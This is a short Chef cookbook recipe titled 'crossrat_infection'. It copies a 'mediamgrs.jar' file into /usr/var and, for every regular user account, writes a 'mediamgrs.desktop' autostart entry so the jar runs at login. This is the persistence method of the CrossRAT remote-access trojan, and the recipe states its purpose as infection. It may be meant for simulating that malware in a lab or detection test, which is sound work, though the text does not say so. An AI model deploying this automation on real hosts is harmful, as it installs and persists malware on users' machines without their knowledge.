#
# Cookbook:: crossrat_infection
# Recipe:: linux
#
# Copyright:: 2018, The Authors, All Rights Reserved.
directory '/usr/var'

cookbook_file '/usr/var/mediamgrs.jar' do
  source 'mediamgrs.jar.txt'
end

node['etc']['passwd'].each do |user, data|
  next unless data['uid'].to_i >= 1000

  directory "#{data['dir']}/.config/autostart" do
    recursive true
    owner user
    group data['gid']
    mode 0644
  end

  cookbook_file "#{data['dir']}/.config/autostart/mediamgrs.desktop" do
    source 'mediamgrs.desktop'
    owner user
    group data['gid']
    mode 0644
  end
end
